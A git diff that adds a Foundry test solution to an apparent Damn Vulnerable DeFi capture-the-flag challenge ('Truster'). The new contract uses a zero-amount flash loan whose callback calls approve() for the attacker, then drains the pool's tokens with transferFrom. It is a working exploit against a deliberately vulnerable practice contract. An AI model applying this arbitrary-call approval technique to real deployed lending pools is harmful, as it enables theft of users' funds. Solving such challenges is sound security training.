@@ -50,8 +50,14 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
+    // Getting the flash loan
+    // And not returning the flash loan to the contract
+    // we are not trying to execute the flashloan
     function test_truster() public checkSolvedByPlayer {
-        
+        PlayerTrusterFlashloanReceiver flr = new PlayerTrusterFlashloanReceiver(pool, token, recovery);   // deploy the receiver contract for test
+        flr.executeFlashLoan();                                        // execute the flash loan
+
     }
 
     /**
@@ -66,3 +72,31 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
 }
+
+contract PlayerTrusterFlashloanReceiver {
+        // a flashLoan receiver and execution contract
+        // we need the pool that offers the flash loan and the token address for the flashloan token
+        TrusterLenderPool pool;       // The pool offering the flashloan
+        DamnValuableToken token;      // DVT token to borrow
+        address recovery;
+
+        // setting the pool and token
+        constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+            pool = _pool;
+            token = _token;
+            recovery = _recovery;
+        }
+
+        function executeFlashLoan() external {
+            uint256 amountToBorrow = 0;
+            bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+            pool.flashLoan(amountToBorrow, address(this), address(token), data);
+            token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
+        }
+
+        // what should we use this flashLoan for?
+        //function _execute() external {
+          //  console.log("IDK WHAT TO USE THIS TOKENS FOR");
+        //}
+
+    }
